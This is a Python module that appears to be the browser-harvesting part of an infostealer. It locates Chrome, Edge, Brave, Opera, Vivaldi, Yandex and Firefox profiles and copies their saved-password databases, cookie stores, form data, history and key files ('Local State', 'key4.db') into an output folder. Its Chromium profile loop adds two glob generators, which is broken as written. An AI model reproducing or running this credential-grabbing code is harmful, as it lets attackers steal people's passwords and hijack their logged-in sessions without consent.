import os
import shutil
from pathlib import Path

from core.logger import logger

CHROMIUM_BROWSERS = {
    "chrome": r"Google\Chrome\User Data",
    "edge": r"Microsoft\Edge\User Data",
    "brave": r"BraveSoftware\Brave-Browser\User Data",
    "opera": r"Opera Software\Opera Stable",
    "opera_gx": r"Opera Software\Opera GX Stable",
    "vivaldi": r"Vivaldi\User Data",
    "yandex": r"Yandex\YandexBrowser\User Data",
}

CHROMIUM_ROOT_FILES = ["Local State", "Preferences", "Bookmarks"]
CHROMIUM_PROFILE_FILES = [
    "Cookies",
    r"Network\Cookies",
    "Login Data",
    "History",
    "Web Data",
]

FIREFOX_PROFILES = r"Mozilla\Firefox\Profiles"
FIREFOX_FILES = [
    "cookies.sqlite",
    "logins.json",
    "key4.db",
    "places.sqlite",
    "formhistory.sqlite",
]


def _local_appdata() -> Path:
    return Path(os.getenv("LOCALAPPDATA", ""))


def _appdata() -> Path:
    return Path(os.getenv("APPDATA", ""))


def _copy_retry(src: Path, dst: Path, tries: int = 3) -> bool:
    for _ in range(tries):
        try:
            if not src.exists():
                return False
            dst.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(src, dst)
            return True
        except PermissionError:
            import time
            time.sleep(0.5)
        except Exception as e:
            logger.error(f"copy failed {src}: {e}")
            return False
    return False


def _grab_chromium(name: str, rel: str, out: Path) -> None:
    base = _local_appdata() / rel
    if not base.exists():
        return
    dest = out / name
    dest.mkdir(parents=True, exist_ok=True)

    for fname in CHROMIUM_ROOT_FILES:
        _copy_retry(base / fname, dest / fname)

    for prof in base.glob("Default") + base.glob("Profile *"):
        if not prof.is_dir():
            continue
        for fname in CHROMIUM_PROFILE_FILES:
            src = prof / fname
            dst = dest / f"{prof.name}_{fname.replace(chr(92), '_')}"
            _copy_retry(src, dst)


def _grab_firefox(out: Path) -> None:
    base = _appdata() / FIREFOX_PROFILES
    if not base.exists():
        return
    for prof in base.iterdir():
        if not prof.is_dir():
            continue
        dest = out / "firefox" / prof.name
        dest.mkdir(parents=True, exist_ok=True)
        for fname in FIREFOX_FILES:
            _copy_retry(prof / fname, dest / fname)


def collect(out: Path) -> None:
    out.mkdir(parents=True, exist_ok=True)
    for name, rel in CHROMIUM_BROWSERS.items():
        logger.info(f"browser: {name}")
        try:
            _grab_chromium(name, rel, out)
        except Exception as e:
            logger.error(f"{name}: {e}")
    logger.info("browser: firefox")
    _grab_firefox(out)
